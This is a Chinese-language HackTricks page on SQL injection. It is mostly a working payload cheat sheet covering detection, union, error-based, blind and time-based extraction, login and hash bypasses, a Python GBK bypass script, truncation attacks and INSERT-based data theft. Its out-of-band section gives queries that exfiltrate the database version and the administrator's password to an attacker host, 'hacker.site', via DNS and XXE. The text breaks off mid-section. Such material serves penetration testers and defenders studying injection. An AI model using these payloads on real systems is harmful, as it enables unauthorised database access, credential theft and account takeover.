<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>SQL Injection</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="sql-injection"><a class="header" href="#sql-injection">SQL Injection</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
<p>​​​​<a href="https://www.rootedcon.com/"><strong>RootedCON</strong></a> 是 <strong>西班牙</strong> 最相关的网络安全事件，也是 <strong>欧洲</strong> 最重要的活动之一。该大会的 <strong>使命是促进技术知识</strong>，是各个学科技术和网络安全专业人士的热烈交流平台。</p>
<p>{% embed url="https://www.rootedcon.com/" %}</p>
<h2 id="什么是-sql-注入"><a class="header" href="#什么是-sql-注入">什么是 SQL 注入？</a></h2>
<p><strong>SQL 注入</strong> 是一种安全漏洞，允许攻击者 <strong>干扰应用程序的数据库查询</strong>。此漏洞使攻击者能够 <strong>查看</strong>、<strong>修改</strong> 或 <strong>删除</strong> 他们不应访问的数据，包括其他用户的信息或应用程序可以访问的任何数据。这些行为可能导致应用程序功能或内容的永久性更改，甚至可能导致服务器的泄露或拒绝服务。</p>
<h2 id="入口点检测"><a class="header" href="#入口点检测">入口点检测</a></h2>
<p>当一个网站由于对与 SQLi 相关的输入的异常服务器响应而 <strong>看似易受 SQL 注入 (SQLi)</strong> 攻击时，<strong>第一步</strong> 是了解如何 <strong>在不干扰查询的情况下注入数据</strong>。这需要有效识别 <strong>从当前上下文中逃逸</strong> 的方法。以下是一些有用的示例：</p>
<pre><code>[Nothing]
'
"
`
')
")
`)
'))
"))
`))
</code></pre>
<p>然后，您需要知道如何<strong>修复查询以避免错误</strong>。为了修复查询，您可以<strong>输入</strong>数据，以便<strong>先前的查询接受新数据</strong>，或者您可以直接<strong>输入</strong>您的数据并<strong>在末尾添加注释符号</strong>。</p>
<p><em>请注意，如果您能看到错误消息或能够发现查询正常工作与不正常工作时的差异，这个阶段将会更容易。</em></p>
<h3 id="评论"><a class="header" href="#评论"><strong>评论</strong></a></h3>
<pre><code class="language-sql">MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
</code></pre>
<h3 id="使用逻辑运算进行确认"><a class="header" href="#使用逻辑运算进行确认">使用逻辑运算进行确认</a></h3>
<p>确认 SQL 注入漏洞的可靠方法涉及执行 <strong>逻辑运算</strong> 并观察预期结果。例如，当 GET 参数 <code>?username=Peter</code> 修改为 <code>?username=Peter' or '1'='1</code> 时，如果返回相同的内容，则表明存在 SQL 注入漏洞。</p>
<p>同样，应用 <strong>数学运算</strong> 作为有效的确认技术。例如，如果访问 <code>?id=1</code> 和 <code>?id=2-1</code> 产生相同的结果，则表明存在 SQL 注入。</p>
<p>演示逻辑运算确认的示例：</p>
<pre><code>page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
</code></pre>
<p>这个词汇表是为了尝试<strong>确认SQL注入</strong>而创建的，方法如下：</p>
<p>{% file src="../../.gitbook/assets/sqli-logic.txt" %}</p>
<h3 id="通过时间确认"><a class="header" href="#通过时间确认">通过时间确认</a></h3>
<p>在某些情况下，你<strong>不会注意到任何变化</strong>在你正在测试的页面上。因此，发现盲SQL注入的一个好方法是让数据库执行操作，并对页面加载所需的<strong>时间产生影响</strong>。<br />
因此，我们将在SQL查询中连接一个需要很长时间才能完成的操作：</p>
<pre><code>MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' &amp;&amp; sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
</code></pre>
<p>在某些情况下，<strong>sleep 函数将不被允许</strong>。然后，您可以使查询<strong>执行复杂操作</strong>，这将需要几秒钟。<em>这些技术的示例将在每种技术上单独评论（如果有的话）</em>。</p>
<h3 id="识别后端"><a class="header" href="#识别后端">识别后端</a></h3>
<p>识别后端的最佳方法是尝试执行不同后端的函数。您可以使用上一节的_<strong>sleep</strong>_ <strong>函数</strong>或这些函数（来自 <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification">payloadsallthethings</a> 的表）：</p>
<pre><code class="language-bash">["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS&gt;0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()&gt;1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)&gt;0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
</code></pre>
<p>此外，如果您可以访问查询的输出，您可以使其<strong>打印数据库的版本</strong>。</p>
<p>{% hint style="info" %}
接下来我们将讨论利用不同类型的SQL注入的不同方法。我们将以MySQL为例。
{% endhint %}</p>
<h3 id="使用portswigger进行识别"><a class="header" href="#使用portswigger进行识别">使用PortSwigger进行识别</a></h3>
<p>{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}</p>
<h2 id="利用基于联合的注入"><a class="header" href="#利用基于联合的注入">利用基于联合的注入</a></h2>
<h3 id="检测列数"><a class="header" href="#检测列数">检测列数</a></h3>
<p>如果您可以看到查询的输出，这是利用它的最佳方法。<br />
首先，我们需要找出<strong>初始请求</strong>返回的<strong>列数</strong>。这是因为<strong>两个查询必须返回相同数量的列</strong>。<br />
通常使用两种方法来实现这一目的：</p>
<h4 id="ordergroup-by"><a class="header" href="#ordergroup-by">Order/Group by</a></h4>
<p>要确定查询中的列数，逐步调整<strong>ORDER BY</strong>或<strong>GROUP BY</strong>子句中使用的数字，直到收到错误响应。尽管<strong>GROUP BY</strong>和<strong>ORDER BY</strong>在SQL中具有不同的功能，但两者可以相同地用于确定查询的列数。</p>
<pre><code class="language-sql">1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
</code></pre>
<pre><code class="language-sql">1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
</code></pre>
<h4 id="union-select"><a class="header" href="#union-select">UNION SELECT</a></h4>
<p>选择更多的空值，直到查询正确：</p>
<pre><code class="language-sql">1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
</code></pre>
<p><em>您应该使用 <code>null</code> 值，因为在某些情况下，查询两侧的列类型必须相同，而 null 在每种情况下都是有效的。</em></p>
<h3 id="提取数据库名称表名称和列名称"><a class="header" href="#提取数据库名称表名称和列名称">提取数据库名称、表名称和列名称</a></h3>
<p>在接下来的示例中，我们将检索所有数据库的名称、数据库的表名称、表的列名称：</p>
<pre><code class="language-sql">#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
</code></pre>
<p><em>每个不同的数据库都有不同的方法来发现这些数据，但方法论始终相同。</em></p>
<h2 id="利用隐藏的基于联合的注入"><a class="header" href="#利用隐藏的基于联合的注入">利用隐藏的基于联合的注入</a></h2>
<p>当查询的输出可见，但基于联合的注入似乎无法实现时，这表明存在<strong>隐藏的基于联合的注入</strong>。这种情况通常会导致盲注入。要将盲注入转变为基于联合的注入，需要识别后端的执行查询。</p>
<p>这可以通过使用盲注入技术以及特定于目标数据库管理系统（DBMS）的默认表来实现。为了理解这些默认表，建议查阅目标DBMS的文档。</p>
<p>一旦提取了查询，就需要调整你的有效载荷以安全地关闭原始查询。随后，将一个联合查询附加到你的有效载荷中，从而利用新可访问的基于联合的注入。</p>
<p>有关更全面的见解，请参阅完整文章 <a href="https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f">Healing Blind Injections</a>。</p>
<h2 id="利用基于错误的注入"><a class="header" href="#利用基于错误的注入">利用基于错误的注入</a></h2>
<p>如果由于某种原因你<strong>无法</strong>看到<strong>查询</strong>的<strong>输出</strong>，但你可以<strong>看到错误消息</strong>，你可以利用这些错误消息来<strong>提取</strong>数据库中的数据。<br />
遵循与基于联合的利用相似的流程，你可以成功地转储数据库。</p>
<pre><code class="language-sql">(select 1 and row(1,1)&gt;(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
</code></pre>
<h2 id="利用盲注入"><a class="header" href="#利用盲注入">利用盲注入</a></h2>
<p>在这种情况下，您无法看到查询的结果或错误，但您可以<strong>区分</strong>查询何时<strong>返回****真</strong>或<strong>假</strong>响应，因为页面上有不同的内容。<br />
在这种情况下，您可以利用这种行为逐字符地转储数据库：</p>
<pre><code class="language-sql">?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
</code></pre>
<h2 id="利用错误盲sqli"><a class="header" href="#利用错误盲sqli">利用错误盲SQLi</a></h2>
<p>这是<strong>与之前相同的情况</strong>，但不是区分查询的真/假响应，而是可以<strong>区分</strong>SQL查询中的<strong>错误</strong>与否（可能是因为HTTP服务器崩溃）。因此，在这种情况下，每次正确猜测字符时，您可以强制产生SQL错误：</p>
<pre><code class="language-sql">AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
</code></pre>
<h2 id="利用基于时间的-sqli"><a class="header" href="#利用基于时间的-sqli">利用基于时间的 SQLi</a></h2>
<p>在这种情况下，<strong>没有</strong>任何方法可以根据页面的上下文来<strong>区分</strong>查询的<strong>响应</strong>。但是，如果猜测的字符是正确的，您可以使页面<strong>加载时间更长</strong>。我们已经在之前看到过这种技术用于<a href="./#confirming-with-timing">确认 SQLi 漏洞</a>。</p>
<pre><code class="language-sql">1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
</code></pre>
<h2 id="stacked-queries"><a class="header" href="#stacked-queries">Stacked Queries</a></h2>
<p>您可以使用堆叠查询来<strong>连续执行多个查询</strong>。请注意，尽管后续查询会被执行，但<strong>结果</strong>不会<strong>返回给应用程序</strong>。因此，这种技术主要用于与<strong>盲漏洞</strong>相关的情况，在这种情况下，您可以使用第二个查询触发DNS查找、条件错误或时间延迟。</p>
<p><strong>Oracle</strong>不支持<strong>堆叠查询</strong>。<strong>MySQL、Microsoft</strong>和<strong>PostgreSQL</strong>支持它们：<code>QUERY-1-HERE; QUERY-2-HERE</code></p>
<h2 id="out-of-band-exploitation"><a class="header" href="#out-of-band-exploitation">Out of band Exploitation</a></h2>
<p>如果<strong>没有其他</strong>利用方法<strong>有效</strong>，您可以尝试使<strong>数据库将</strong>信息外泄到您控制的<strong>外部主机</strong>。例如，通过DNS查询：</p>
<pre><code class="language-sql">select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
</code></pre>
<h3 id="通过-xxe-进行带外数据泄露"><a class="header" href="#通过-xxe-进行带外数据泄露">通过 XXE 进行带外数据泄露</a></h3>
<pre><code class="language-sql">a' UNION SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"&gt; %remote;]&gt;'),'/l') FROM dual-- -
</code></pre>
<h2 id="自动化利用"><a class="header" href="#自动化利用">自动化利用</a></h2>
<p>查看 <a href="sqlmap/">SQLMap Cheatsheet</a> 以利用 SQLi 漏洞与 <a href="https://github.com/sqlmapproject/sqlmap"><strong>sqlmap</strong></a>。</p>
<h2 id="技术特定信息"><a class="header" href="#技术特定信息">技术特定信息</a></h2>
<p>我们已经讨论了利用 SQL 注入漏洞的所有方法。在本书中找到一些更多依赖于数据库技术的技巧：</p>
<ul>
<li><a href="ms-access-sql-injection.html">MS Access</a></li>
<li><a href="mssql-injection.html">MSSQL</a></li>
<li><a href="mysql-injection/">MySQL</a></li>
<li><a href="oracle-injection.html">Oracle</a></li>
<li><a href="postgresql-injection/">PostgreSQL</a></li>
</ul>
<p>或者你会在 <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"><strong>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</strong></a> 找到关于 MySQL、PostgreSQL、Oracle、MSSQL、SQLite 和 HQL 的 <strong>大量技巧</strong>。</p>
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
<p>​​​​​<a href="https://www.rootedcon.com/"><strong>RootedCON</strong></a> 是 <strong>西班牙</strong> 最相关的网络安全事件，也是 <strong>欧洲</strong> 最重要的事件之一。以 <strong>促进技术知识</strong> 为使命，这个大会是各个学科技术和网络安全专业人士的热烈交流点。</p>
<p>{% embed url="https://www.rootedcon.com/" %}</p>
<h2 id="认证绕过"><a class="header" href="#认证绕过">认证绕过</a></h2>
<p>尝试绕过登录功能的列表：</p>
<p>{% content-ref url="../login-bypass/sql-login-bypass.md" %}
<a href="../login-bypass/sql-login-bypass.html">sql-login-bypass.md</a>
{% endcontent-ref %}</p>
<h3 id="原始哈希认证绕过"><a class="header" href="#原始哈希认证绕过">原始哈希认证绕过</a></h3>
<pre><code class="language-sql">"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
</code></pre>
<p>此查询展示了在身份验证检查中使用MD5并将原始输出设置为true时的漏洞，使系统容易受到SQL注入攻击。攻击者可以通过构造输入来利用这一点，这些输入在哈希时会生成意外的SQL命令部分，从而导致未经授权的访问。</p>
<pre><code class="language-sql">md5("ffifdyop", true) = 'or'6�]��!r,��b�
sha1("3fDf ", true) = Q�u'='�@�[�t�- o��_-!
</code></pre>
<h3 id="注入哈希认证绕过"><a class="header" href="#注入哈希认证绕过">注入哈希认证绕过</a></h3>
<pre><code class="language-sql">admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
</code></pre>
<p><strong>推荐列表</strong>：</p>
<p>您应该将列表中的每一行用作用户名，密码始终为：<em><strong>Pass1234.</strong></em><br />
&amp;#xNAN;<em>(这些有效载荷也包含在本节开头提到的大列表中)</em></p>
<p>{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}</p>
<h3 id="gbk-认证绕过"><a class="header" href="#gbk-认证绕过">GBK 认证绕过</a></h3>
<p>如果 ' 被转义，您可以使用 %A8%27，当 ' 被转义时，它将被创建：0xA80x5c0x27 (<em>╘'</em>)</p>
<pre><code class="language-sql">%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
</code></pre>
<p>Python 脚本：</p>
<pre><code class="language-python">import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
</code></pre>
<h3 id="多语言注入多上下文"><a class="header" href="#多语言注入多上下文">多语言注入（多上下文）</a></h3>
<pre><code class="language-sql">SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
</code></pre>
<h2 id="insert-statement"><a class="header" href="#insert-statement">Insert Statement</a></h2>
<h3 id="修改现有对象用户的密码"><a class="header" href="#修改现有对象用户的密码">修改现有对象/用户的密码</a></h3>
<p>为此，您应该尝试<strong>创建一个名为“主对象”的新对象</strong>（在用户的情况下可能是<strong>admin</strong>）并修改某些内容：</p>
<ul>
<li>创建名为：<strong>AdMIn</strong>（大小写字母）</li>
<li>创建名为：**admin=**的用户</li>
<li><strong>SQL截断攻击</strong>（当用户名或电子邮件有某种<strong>长度限制</strong>时）--&gt; 创建名为：<strong>admin [大量空格] a</strong></li>
</ul>
<h4 id="sql截断攻击"><a class="header" href="#sql截断攻击">SQL截断攻击</a></h4>
<p>如果数据库存在漏洞，并且用户名的最大字符数例如为30，而您想要冒充用户<strong>admin</strong>，请尝试创建一个名为：“<em>admin [30个空格] a</em>”的用户名和任何密码。</p>
<p>数据库将<strong>检查</strong>输入的<strong>用户名</strong>是否<strong>存在</strong>于数据库中。如果<strong>不存在</strong>，它将<strong>截断****用户名</strong>到<strong>最大允许字符数</strong>（在这种情况下为：“<em>admin [25个空格]</em>”），然后它将<strong>自动删除末尾的所有空格</strong>，在数据库中更新用户“<strong>admin</strong>”的<strong>新密码</strong>（可能会出现一些错误，但这并不意味着这没有成功）。</p>
<p>更多信息：<a href="https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html">https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html</a> &amp; <a href="https://resources.infosecinstitute.com/sql-truncation-attack/#gref">https://resources.infosecinstitute.com/sql-truncation-attack/#gref</a></p>
<p><em>注意：在最新的MySQL安装中，此攻击将不再按上述方式工作。虽然比较仍然默认忽略尾随空格，但尝试插入一个超过字段长度的字符串将导致错误，插入将失败。有关此检查的更多信息：</em> <a href="https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation"><em>https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation</em></a></p>
<h3 id="mysql插入基于时间的检查"><a class="header" href="#mysql插入基于时间的检查">MySQL插入基于时间的检查</a></h3>
<p>根据您认为需要的数量添加<code>','',''</code>以退出VALUES语句。如果执行了延迟，则您有SQL注入。</p>
<pre><code class="language-sql">name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
</code></pre>
<h3 id="on-duplicate-key-update"><a class="header" href="#on-duplicate-key-update">ON DUPLICATE KEY UPDATE</a></h3>
<p><code>ON DUPLICATE KEY UPDATE</code> 子句在 MySQL 中用于指定当尝试插入一行将导致 UNIQUE 索引或 PRIMARY KEY 中的重复值时，数据库应采取的操作。以下示例演示了如何利用此功能修改管理员帐户的密码：</p>
<p>示例有效负载注入：</p>
<p>有效负载可能被构造如下，其中尝试将两行插入到 <code>users</code> 表中。第一行是诱饵，第二行针对现有管理员的电子邮件，目的是更新密码：</p>
<pre><code class="language-sql">INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
</code></pre>
<p>Here's how it works:</p>
<ul>
<li>查询尝试插入两行：一行为 <code>generic_user@example.com</code>，另一行为 <code>admin_generic@example.com</code>。</li>
<li>如果 <code>admin_generic@example.com</code> 的行已经存在，<code>ON DUPLICATE KEY UPDATE</code> 子句会触发，指示 MySQL 更新现有行的 <code>password</code> 字段为 "bcrypt_hash_of_newpassword"。</li>
<li>因此，可以使用 <code>admin_generic@example.com</code> 尝试身份验证，密码对应于 bcrypt 哈希（"bcrypt_hash_of_newpassword" 代表新密码的 bcrypt 哈希，应替换为所需密码的实际哈希）。</li>
</ul>
<h3 id="提取信息"><a class="header" href="#提取信息">提取信息</a></h3>
<h4 id="同时创建-2-个账户"><a class="header" href="#同时创建-2-个账户">同时创建 2 个账户</a></h4>
<p>在尝试创建新用户时，需要用户名、密码和电子邮件：</p>
<pre><code>SQLi payload:
username=TEST&amp;password=TEST&amp;email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
</code></pre>
<h4 id="使用十进制或十六进制"><a class="header" href="#使用十进制或十六进制">使用十进制或十六进制</a></h4>
<p>使用此技术，您可以仅创建 1 个帐户来提取信息。重要的是要注意，您不需要注释任何内容。</p>
<p>使用 <strong>hex2dec</strong> 和 <strong>substr</strong>：</p>
<pre><code class="language-sql">'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
</code></pre>
<p>要获取文本，您可以使用：</p>
<pre><code class="language-python">__import__('binascii').unhexlify(hex(215573607263)[2:])
</code></pre>
<p>使用 <strong>hex</strong> 和 <strong>replace</strong>（以及 <strong>substr</strong>）：</p>
<pre><code class="language-sql">'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
